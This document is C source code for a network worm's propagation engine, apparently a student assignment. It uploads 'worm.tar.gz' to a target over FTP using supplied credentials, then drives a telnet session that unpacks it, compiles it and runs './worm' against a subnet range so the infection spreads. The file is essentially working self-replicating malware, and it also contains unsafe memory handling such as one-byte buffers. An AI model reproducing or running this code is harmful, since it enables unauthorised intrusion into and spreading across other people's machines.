#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/sendfile.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <termios.h>
#include <fcntl.h>
#include <arpa/inet.h>

void parseIPPort(char buffer[], char *ip, int *port){
    char *token = (char*) malloc(sizeof(char));
    char *aux = (char*) malloc(sizeof(char));
    char *aux2 = (char*) malloc(sizeof(char));
    char *ip_aux = (char*) malloc(sizeof(char));
    char **range = malloc(2*sizeof(char *));
    char *ponto = ".";
    int i = 0, p1 = 0, p2 = 0;
    
    token = strtok(buffer, " ");
   
    while(token != NULL) {
        aux = token;
        token = strtok(NULL, " ");
    }
 
    token = strtok(aux, "(");
    aux2 = strdup(token);
    token = strtok(aux2, ")");
    aux = strdup(token);
    
    token = strtok(aux, ",");
   
    while(token != NULL) {
        range[i] = token;
        token = strtok(NULL, ",");
        i +=1;
    }

    for(i = 0; i < 3; i++){
        strcpy(ip_aux, range[i]);
        strcat(ip_aux, ponto);
        strcat(ip, ip_aux);
    }
    
    strcpy(ip_aux, range[i]);
    strcat(ip, ip_aux);

    p1 = atoi(range[i+1]);
    p2 = atoi(range[i+2]);

    *port = p1*256+p2;
}

void fileTransfer(char *ip, char *username, char *password){
    char buffer[1024];
    char *ipT = (char*) malloc(sizeof(char));
    char user[100] = "USER ";
    char pass[100] = "PASS ";
    char model[10] = "MODE C\n";
    char type[10] = "TYPE I\n";
    char stru[10] = "STRU F\n";
    char pasv[10] = "PASV\n";
    char cwd[100] = "CWD /home/";
    char cwdWD[100] = "CWD Asgn03KLG/\n";
    char pwd[10] = "PWD\n";
    char mkd[20] = "MKD Asgn03KLG\n";
    char quit[10] = "QUIT\n";
    char stor[20] = "STOR worm.tar.gz\n";
    char file[20] = "worm.tar.gz";
    int sent, sock = 0, sockT = 0, percent = 0, port = 0, accept_socket, fileSize = 0;
    off_t offset = 0; //file offset
    struct sockaddr_in serverAddr, transfSock;
    struct stat obj;

    //CONNECT FTP
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&serverAddr, '0', sizeof(serverAddr));
    serverAddr.sin_addr.s_addr = inet_addr(ip);
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(21);

    if(connect(sock, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0){
        printf("Erro: conexao falhou. \n");
        exit(1);
    }
    
    //Resposta do Connect
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando nome do usuario
    memset(buffer, '0', 1024);
    strcat(user, username);    
    strcat(user, "\n");    
    if(send(sock, user, strlen(user), 0) < 0){
        printf("Erro: nome do usuario invalido ou incorreto. \n");
        exit(1);    
    }

    //Resposta do nome do usuario
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando senha
    memset(buffer, '0', 1024);
    strcat(pass, password);
    strcat(pass, "\n");
    if(send(sock, pass, strlen(pass), 0) < 0){
        printf("Erro: senha invalida \n");
        exit(1);
    } 

    //Resposta da Senha
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Modo de Transferencia: Stream
    memset(buffer, '0', 1024);
    send(sock, model, strlen(model), 0);

    //Resposta do Modo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
 
    //Enviando Tipo de Transferencia: Binario
    memset(buffer, '0', 1024);
    send(sock, type, strlen(type), 0);
    
    //Resposta do Tipo
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Estrutura de Dados: F
    memset(buffer, '0', 1024);
    send(sock, stru, strlen(stru), 0);
    
    //Resposta da Estrutura de Dados
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando Passive Mode'
    memset(buffer, '0', 1024);
    send(sock, pasv, strlen(pasv), 0);

    //Resposta do Passive Mode
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Parse para pegar IP e Porta
    parseIPPort(buffer, ipT, &port);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    strcat(cwd, username);
    strcat(cwd, "\n");
    send(sock, cwd, strlen(cwd), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'MKD'
    memset(buffer, '0', 1024);
    send(sock, mkd, strlen(mkd), 0);
    
    //Resposta do 'MKD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    //Enviando comando 'CD'
    memset(buffer, '0', 1024);
    send(sock, cwdWD, strlen(cwdWD), 0);
    
    //Resposta do 'CD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'PWD'
    memset(buffer, '0', 1024);
    send(sock, pwd, strlen(pwd), 0);
    
    //Resposta do 'PWD'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando STRO
    memset(buffer, '0', 1024);
    send(sock, stor, strlen(stor), 0);

    //CONNECT FTP
    sockT = socket(AF_INET, SOCK_STREAM, 0);
    if(sock < 0){
        printf("Erro ao criar o socket.\n");
        exit(1);
    }  

    memset(&transfSock, '0', sizeof(transfSock));
    transfSock.sin_addr.s_addr = inet_addr(ipT);
    transfSock.sin_family = AF_INET;
    transfSock.sin_port = htons(port);

    if(connect(sockT, (struct sockaddr*)&transfSock, sizeof(transfSock)) < 0){
         perror("");
         exit(1);
    }
  
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    sent = open(file, O_RDONLY);

    if(sent < 0){
        printf("Arquivo não encontrado\n");
        exit(0);
    }
        
    //get size of file
    fstat(sent, &obj);
    
    offset = 0;
    percent =  sendfile(sockT, sent, &offset, obj.st_size);
    if(percent < 0){ 
        printf("Não foi possivel fazer a transferencia\n");
        exit(1);
    }

    if (percent != obj.st_size) {
        printf("Transferencia incompleta: %d de %d bytes\n", percent, (int)obj.st_size);
        exit(1);
    }
    
    close(sent);  
    close(sockT);

    //Resposta do 'STOR'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);
    
    //Enviando comando 'QUIT'
    memset(buffer, '0', 1024);
    send(sock, quit, strlen(quit), 0);
    
    //Resposta do 'QUIT'
    bzero(buffer, 1024);
    recv(sock, buffer, sizeof(buffer), 0);
    printf("%s", buffer);

    if(sock >= 0){
        close(sock);
    }
}

void fileExecute(char *ip, char *username, char *pass){
    char buff[1024];
    FILE *file;
    pid_t child; // note that the actual return type of fork is 
             // pid_t, though it's probably just an int typedef'd or macro'd

    
    child = vfork();
    if (child == -1){
         perror("Fork failed");
    }
    else if (child == 0){
        //abrir conexão
        memset(buff, '0', 1024);
        strcpy(buff, "telnet ");
        strcat(buff, ip);
        strcat(buff, " 23");
        file = popen(buff, "w");
        if(file == NULL){
            perror("");
        }
        
        //login
        fflush(file);
        sleep(2); 
        memset(buff, '0', 1024);
        strcpy(buff, username);
        strcat(buff, "\n");
        fprintf(file, "%s", buff);
        
        //pass
        fflush(file);
        sleep(2);
        memset(buff, '0', 1024);
        strcpy(buff, pass);
        strcat(buff, "\n");
        fprintf(file, "%s", buff);
        
        //pwd
        fflush(file);
        sleep(2);
        fprintf(file, "pwd\n");
        
        //cd
        fflush(file);
        sleep(2);
        fprintf(file, "cd /home/kath/Asgn03KLG\n");
        
        //descompactar
        fflush(file);
        sleep(2);
        fprintf(file, "tar -vzxf worm.tar.gz\n");
        
        //make
        fflush(file);
        sleep(2);
        fprintf(file, "make\n");
        
        //execute
        fflush(file);
        sleep(2);
        fprintf(file, "./worm 192.168.0.225 0-25 4\n");
        
        //exit
        fflush(file);
        sleep(2);
        fprintf(file, "exit\n");
        
        pclose(file);
        _exit(23);
    }

}

void propagation_engine(char* ip, char *username, char *pass){    
    fileTransfer(ip, username, pass);
    fileExecute(ip, username, pass);
}
